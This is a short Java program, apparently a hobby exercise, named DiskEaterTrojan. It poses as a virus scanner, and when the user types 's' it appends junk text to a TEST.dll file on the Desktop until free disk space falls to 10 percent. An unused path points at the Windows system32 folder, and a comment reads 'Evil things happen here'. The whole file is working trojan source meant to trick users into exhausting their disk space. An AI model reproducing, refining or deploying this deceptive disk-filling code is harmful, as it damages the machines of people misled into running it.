
import java.io.*;
import java.util.Scanner;

import javax.swing.filechooser.FileSystemView;

public class DiskEaterTrojan 
{
	public static void main(String[] args)
	{
		System.out.println("Enter 's' to scan for viruses or enter anything else to exit.");
		Scanner scan = new Scanner(System.in);
		String input = scan.nextLine();
		
		//This requires admin priveleges to write to. I'm not sure how to do this right now.
		String actualPath = System.getenv("WINDIR") + "/system32/TEST.dll";
		
		String testPath = System.getProperty("user.home") + "/Desktop/TEST.dll";
		
		if(input.equals("s"))
		{
			//Evil things happen here
			writeFile(testPath);
		}
		else
		{
			System.out.println("Exiting...");
			System.exit(0);
		}
			
	}
	
	private static void writeFile(String fileName)
	{
		String line = "Help I am stuck in a fortune cookie message factory!!!!\n";
		
		try {
			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(fileName, true)));
			
			//Stop writing the file when we only have 10% disk space left
			while(checkFreeSpacePercent(fileName) > 10) 
			{
				outStream.writeUTF(line);
			}
			outStream.flush();
			outStream.close();
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	private static float checkFreeSpacePercent(String filePath)
	{
		File f = new File(filePath);
		System.out.println("Printing free space");
		
		float percent = ((float)f.getFreeSpace() / (float)f.getTotalSpace())* 100.0f;
		
		System.out.println(percent);
		return percent;
	}
}
